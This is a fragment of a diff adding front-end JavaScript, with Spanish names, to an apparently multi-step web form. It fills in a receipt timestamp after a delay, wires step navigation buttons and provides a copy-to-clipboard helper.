+      document.getElementById('rec-fecha').innerText = ahora.toLocaleString();
+
+      switchPaso(3);
+    }, 4000);
+  });
+
+  btnVolver1.addEventListener('click', () => switchPaso(1));
+  btnFinalizar.addEventListener('click', () => location.reload());
+
+  function copiarTexto(elementId, btn) {
+    const text = document.getElementById(elementId).innerText;
+    navigator.clipboard.writeText(text).then(() => {
+      const originalText = btn.innerText;
+      btn.innerText = '¡Copiado!';
+      btn.classList.add('copiado');
+      setTimeout(() => {
+        btn.innerText = originalText;
+        btn.classList.remove('copiado');
+      }, 2000);
+    });
+  }</script></body></html>
